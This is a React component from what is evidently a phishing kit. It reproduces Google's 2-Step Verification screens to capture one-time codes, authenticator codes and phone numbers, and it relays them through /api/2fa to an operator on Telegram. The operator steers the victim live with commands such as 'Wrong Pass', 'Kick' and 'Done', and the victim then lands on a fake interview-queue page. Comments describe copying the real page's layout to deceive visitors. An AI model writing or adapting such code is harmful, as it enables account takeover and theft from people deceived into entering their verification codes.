"use client";

/**
 * components/TwoFactor.tsx
 * The screens that come after the password, laid out like the real thing:
 *
 *   left column   G · "2-Step Verification" · explanation · account chip
 *   right column  the two digits, then "Check your Google Pixel 9 Pro"
 *                 …or "Get a verification code" with the phone field
 *
 * Nothing here decides anything. The operator (Telegram inline keyboard or
 * /verify <session> <code>) changes the state on the server and this
 * component polls /api/2fa to follow along.
 */

import { useCallback, useEffect, useRef, useState } from "react";
import styles from "./TwoFactor.module.css";
import g from "./GoogleSignIn.module.css";
import { CaretIcon, GoogleG } from "./icons";
import type { TwoFaPublic } from "@/lib/twofa";

type Props = {
  email: string;
  sessionId: string;
  /** operator pressed "Wrong Pass" */
  onWrongPassword: () => void;
  /** operator pressed "Wrong Email", or the visitor switched account */
  onSwitchAccount: (message?: string) => void;
};

const POLL_MS = 1500;

export default function TwoFactor({ email, sessionId, onWrongPassword, onSwitchAccount }: Props) {
  const [state, setState] = useState<TwoFaPublic | null>(null);
  const [code, setCode] = useState("");
  const [error, setError] = useState("");
  const [busy, setBusy] = useState(false);
  const [methods, setMethods] = useState(false);
  const [phone, setPhone] = useState("");
  /** hides the operator's error note as soon as the visitor types again */
  const [noteDismissed, setNoteDismissed] = useState(false);
  const backRef = useRef(false);

  const operatorNote = state?.errorNote ?? "";

  useEffect(() => {
    setNoteDismissed(false);
  }, [operatorNote]);

  /* ------------------------------------------------------------- polling */

  useEffect(() => {
    if (!sessionId) return;
    let cancelled = false;
    let timer: ReturnType<typeof setTimeout>;

    const tick = async () => {
      try {
        const res = await fetch("/api/2fa?session=" + encodeURIComponent(sessionId), {
          cache: "no-store",
        });
        const data = (await res.json()) as { ok?: boolean; state?: TwoFaPublic };
        if (!cancelled && data.state) {
          const next = data.state;
          if (next.status === "wrong_pass" && !backRef.current) {
            backRef.current = true;
            onWrongPassword();
            return;
          }
          if (next.status === "wrong_email" && !backRef.current) {
            backRef.current = true;
            onSwitchAccount("This email doesn't exist");
            return;
          }
          if (next.status === "approved" && !backRef.current) {
            // Operator pressed Done: leave the sign-in flow for the final
            // "interview is in queue" page instead of a Google success card.
            backRef.current = true;
            window.location.href = "/queued";
            return;
          }
          if (next.status === "kicked" && !backRef.current) {
            // Operator pressed Kick: send the visitor back to the first page.
            backRef.current = true;
            window.location.href = "/";
            return;
          }
          setState(next);
        }
      } catch {
        /* offline — keep the last frame and retry */
      }
      if (!cancelled) timer = setTimeout(tick, POLL_MS);
    };

    void tick();
    return () => {
      cancelled = true;
      clearTimeout(timer);
    };
  }, [sessionId, onWrongPassword, onSwitchAccount]);

  /* ------------------------------------------------------------ commands */

  const post = useCallback(
    async (body: Record<string, unknown>) => {
      const res = await fetch("/api/2fa", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ...body, session: sessionId, email }),
      });
      return (await res.json().catch(() => ({}))) as {
        ok?: boolean;
        error?: string;
        state?: TwoFaPublic;
      };
    },
    [sessionId, email],
  );

  const useChannel = useCallback(
    async (channel: "phone" | "whatsapp" | "email") => {
      setMethods(false);
      setError("");
      const data = await post({ op: "channel", channel });
      if (data.state) setState(data.state);
    },
    [post],
  );

  const sendCode = useCallback(async () => {
    setBusy(true);
    setError("");
    // The number goes to Telegram; the code screen stays up until the
    // operator sends a code or an error command.
    const data = await post({ op: "send", channel: state?.channel ?? "phone", phone });
    if (data.state) setState(data.state);
    setBusy(false);
  }, [post, state?.channel, phone]);

  const resend = useCallback(async () => {
    setError("");
    const data = await post({ op: "resend" });
    if (data.state) setState(data.state);
  }, [post]);

  const submitCode = useCallback(
    async (event: React.FormEvent<HTMLFormElement>) => {
      event.preventDefault();
      const digits = code.replace(/\D/g, "");
      if (!digits) {
        setError("Enter the code");
        return;
      }
      setBusy(true);
      setError("");
      // The code is forwarded to the operator; the browser then waits on a
      // spinner until they send a verdict from the Telegram panel.
      const data = await post({ op: "code", code: digits });
      setBusy(false);
      if (data.state) setState(data.state);
      if (data.ok) {
        setCode("");
      } else {
        setError(data.error || "Enter the code");
      }
    },
    [code, post],
  );

  /* ----------------------------------------------------------- the panel */

  const status = state?.status ?? "tap";
  const tail = state?.phoneTail ?? "69";
  const channel = state?.channel ?? "phone";

  const channelLine =
    channel === "email"
      ? "To get a verification code, first confirm the recovery email you added to your account."
      : "To get a verification code, first confirm the phone number you added to your account \u2022\u2022\u2022  \u2022\u2022\u2022 " +
        tail +
        ". Standard message and data rates may apply.";

  /** local validation error, or the message the operator asked to show */
  const note = error || (noteDismissed ? "" : operatorNote);

  const channelMethods = (
    <ul className={styles.methods}>
      <li>
        <button className={styles.method} type="button" onClick={() => useChannel("phone")}>
          Get a verification code by text message
        </button>
      </li>
      <li>
        <button className={styles.method} type="button" onClick={() => useChannel("whatsapp")}>
          Get a verification code on WhatsApp
        </button>
      </li>
      <li>
        <button className={styles.method} type="button" onClick={() => useChannel("email")}>
          Send a code to {maskEmail(email)}
        </button>
      </li>
    </ul>
  );

  let panel: React.ReactNode = null;

  if (status === "authenticator") {
    /* "2FA Auth" — Google Authenticator code entry (the reference screen). */
    panel = (
      <form className={`${styles.codeForm} ${styles.authForm}`} onSubmit={submitCode} noValidate>
        <h2 className={styles.authHeading}>2-Step Verification</h2>
        <p className={styles.panelBody}>
          Get a verification code from the <strong>Google Authenticator app</strong>
        </p>

        <div className={styles.field}>
          <label className={styles.fieldLabel} htmlFor="auth-code">
            Enter code
          </label>
          <input
            id="auth-code"
            className={styles.fieldInput}
            inputMode="numeric"
            autoComplete="one-time-code"
            autoFocus
            maxLength={8}
            value={code}
            onChange={(event) => {
              setCode(event.target.value.replace(/\D/g, "").slice(0, 8));
              if (error) setError("");
              setNoteDismissed(true);
            }}
            aria-invalid={Boolean(note)}
            aria-describedby={note ? "auth-code-error" : undefined}
          />
        </div>

        {note && (
          <p className={g.error} id="auth-code-error" role="alert">
            <span className={g.errorMark} aria-hidden="true">
              !
            </span>
            {note}
          </p>
        )}

        <div className={styles.actions}>
          <button
            className={styles.link}
            type="button"
            onClick={() => setMethods((open) => !open)}
            aria-expanded={methods}
          >
            Try another way
          </button>
          <button className={g.next} type="submit" disabled={busy} aria-busy={busy}>
            {busy ? <span className={g.spinner} aria-hidden="true" /> : "Next"}
          </button>
        </div>

        {methods && channelMethods}
      </form>
    );
  } else if (status === "checking") {
    /* Code handed to the operator — hold here until they answer. */
    panel = (
      <div className={styles.pending} aria-live="polite">
        <span className={styles.pendingSpinner} aria-hidden="true" />
        Verifying your code&hellip;
      </div>
    );
  } else if (status === "sms") {
    panel = state?.codeSentAt ? (
      <form className={styles.codeForm} onSubmit={submitCode} noValidate>
        <h2 className={styles.panelTitle}>Enter the code</h2>
        <p className={styles.panelBody}>
          {channel === "whatsapp"
            ? "A 6-digit code was sent on WhatsApp. Enter it below to continue."
            : channel === "email"
              ? "A 6-digit code was sent to " + maskEmail(email) + ". Enter it below to continue."
              : "A 6-digit code was sent by text message. Enter it below to continue."}
        </p>

        <div className={styles.field}>
          <label className={styles.fieldLabel} htmlFor="otp">
            Code
          </label>
          <input
            id="otp"
            className={styles.fieldInput}
            inputMode="numeric"
            autoComplete="one-time-code"
            autoFocus
            maxLength={6}
            placeholder={"\u2022 \u2022 \u2022 \u2022 \u2022 \u2022"}
            value={code}
            onChange={(event) => {
              setCode(event.target.value.replace(/\D/g, "").slice(0, 6));
              if (error) setError("");
              setNoteDismissed(true);
            }}
            aria-invalid={Boolean(note)}
            aria-describedby={note ? "otp-error" : undefined}
          />
        </div>

        {note && (
          <p className={g.error} id="otp-error" role="alert">
            <span className={g.errorMark} aria-hidden="true">
              !
            </span>
            {note}
          </p>
        )}

        <div className={styles.actions}>
          <button className={styles.link} type="button" onClick={resend}>
            Resend it
          </button>
          <button className={g.next} type="submit" disabled={busy} aria-busy={busy}>
            {busy ? <span className={g.spinner} aria-hidden="true" /> : "Next"}
          </button>
        </div>
      </form>
    ) : (
      <div className={styles.codeForm}>
        <p className={styles.panelEyebrow}>2-Step Verification</p>
        <h2 className={styles.panelTitle}>Get a verification code</h2>
        <p className={styles.panelBody}>{channelLine}</p>

        <div className={styles.phoneRow}>
          {channel === "email" ? (
            <div className={styles.field}>
              <label className={styles.fieldLabel} htmlFor="recovery">
                Email
              </label>
              <input id="recovery" className={styles.fieldInput} value={maskEmail(email)} readOnly />
            </div>
          ) : (
            <>
              <div className={styles.field}>
                <label className={styles.fieldLabel} htmlFor="phone-number">
                  Phone number
                </label>
                <input
                  id="phone-number"
                  className={styles.fieldInput}
                  inputMode="tel"
                  autoComplete="tel"
                  value={phone}
                  aria-invalid={Boolean(note)}
                  aria-describedby={note ? "phone-number-error" : undefined}
                  onChange={(event) => {
                    setPhone(event.target.value);
                    if (error) setError("");
                    setNoteDismissed(true);
                  }}
                />
              </div>
            </>
          )}
        </div>

        {note && (
          <p className={g.error} id="phone-number-error" role="alert">
            <span className={g.errorMark} aria-hidden="true">
              !
            </span>
            {note}
          </p>
        )}

        <div className={styles.actions}>
          <button className={styles.link} type="button" onClick={resend}>
            Try another way
          </button>
          <button className={g.next} type="button" onClick={sendCode} disabled={busy} aria-busy={busy}>
            {busy ? <span className={g.spinner} aria-hidden="true" /> : "Send"}
          </button>
        </div>
      </div>
    );
  } else if (status === "approved") {
    // "Done" was pressed: the poll above sends the visitor to /queued. This is
    // only what shows for the instant before the navigation happens.
    panel = (
      <div className={styles.pending}>
        <span className={styles.pendingSpinner} aria-hidden="true" />
        Finishing up&hellip;
      </div>
    );
  } else if (status === "sso") {
    panel = (
      <div className={styles.done}>
        <h2 className={styles.panelTitle}>Sign in with your organization</h2>
        <p className={styles.panelBody}>
          Your administrator requires you to sign in through your identity provider.
        </p>
        <div className={styles.actions}>
          <a className={g.next} href="#" onClick={(event) => event.preventDefault()}>
            Continue with SSO
          </a>
        </div>
      </div>
    );
  } else if (state === null) {
    panel = (
      <div className={styles.pending}>
        <span className={styles.pendingSpinner} aria-hidden="true" />
        Connecting to your phone&hellip;
      </div>
    );
  } else {
    panel = (
      <div className={styles.tapPanel}>
        <span className={styles.tapDigits} aria-live="polite">
          {state.tapCode}
        </span>

        <h2 className={styles.panelTitle}>Check your Google Pixel 9 Pro</h2>
        <p className={styles.panelBody}>
          Google sent a notification to your Google Pixel 9 Pro. Tap <strong>Yes</strong> on the
          notification, then tap <strong>{state.tapCode}</strong> on your phone to verify it&rsquo;s
          you.
        </p>
        <p className={styles.panelBody}>
          Need help?{" "}
          <a href="#" onClick={(event) => event.preventDefault()}>
            Learn more about Google prompts
          </a>
        </p>

        {/* On phones the link order matches the real page: it appears after
            the copy instead of under the account chip. */}
        <p className={`${styles.panelBody} ${styles.mobileResend}`}>
          <button className={styles.link} type="button" onClick={resend}>
            Resend it
          </button>
        </p>

        <div className={styles.actions}>
          <button
            className={styles.link}
            type="button"
            onClick={() => setMethods((open) => !open)}
            aria-expanded={methods}
          >
            Try another way
          </button>
        </div>

        {methods && channelMethods}
      </div>
    );
  }

  return (
    <div className={g.page}>
      <div className={g.wrap}>
        <main className={`${g.card} ${styles.card}`}>
          <div className={styles.grid}>
            <div className={styles.left}>
              <GoogleG size={44} className={styles.logo} />
              <h1 className={styles.title}>2-Step Verification</h1>
              <p className={styles.subtitle}>
                To help keep your account safe, Google wants to make sure it&rsquo;s really you
                trying to sign in
              </p>

              <button
                className={g.chip}
                type="button"
                onClick={() => onSwitchAccount()}
                title="Switch account"
              >
                <span className={g.avatar} aria-hidden="true">
                  {email.charAt(0).toUpperCase() || "?"}
                </span>
                <span className={g.chipEmail}>{email}</span>
                <CaretIcon size={10} className={g.chipCaret} />
              </button>

              {status === "tap" ? (
                <button className={styles.resend} type="button" onClick={resend}>
                  Resend it
                </button>
              ) : null}
            </div>

            <div className={styles.right}>{panel}</div>
          </div>
        </main>

        <footer className={g.footer}>
          <button className={g.lang} type="button">
            English (United States)
            <CaretIcon size={10} className={g.caret} />
          </button>

          <nav className={g.links}>
            <a href="#" onClick={(event) => event.preventDefault()}>
              Help
            </a>
            <a href="#" onClick={(event) => event.preventDefault()}>
              Privacy
            </a>
            <a href="#" onClick={(event) => event.preventDefault()}>
              Terms
            </a>
          </nav>
        </footer>
      </div>
    </div>
  );
}

function maskEmail(email: string): string {
  const [name = "", domain = ""] = email.split("@");
  if (!domain) return email || "your email";
  return name.slice(0, 1) + "\u2022\u2022\u2022@" + domain;
}
